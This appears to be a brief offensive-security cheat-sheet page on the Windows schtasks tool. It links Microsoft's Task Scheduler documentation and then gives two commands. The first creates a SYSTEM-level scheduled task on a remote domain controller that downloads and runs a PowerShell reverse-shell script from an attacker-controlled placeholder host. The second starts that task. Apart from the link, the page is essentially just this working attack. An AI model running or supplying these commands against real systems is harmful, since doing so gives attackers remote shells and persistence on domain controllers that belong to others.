---
description: Task Scheduler Configuration Tool (schtasks.exe)
---

# Task Scheduler

{% embed url="https://docs.microsoft.com/en-us/windows/win32/taskschd/about-the-task-scheduler" %}

{% code overflow="wrap" %}
```
schtasks /create /tn "shell" /ru "NT Authority\SYSTEM" /s dc.targetdomain.com /sc weekly /tr "Powershell.exe -c 'IEX (New-Object Net.WebClient).DownloadString(''http://<IP>/Invoke-PowerShellTcpRun.ps1''')'"

```
{% endcode %}

```
schtasks /RUN /TN "shell" /s dc.targetdomain.com
```
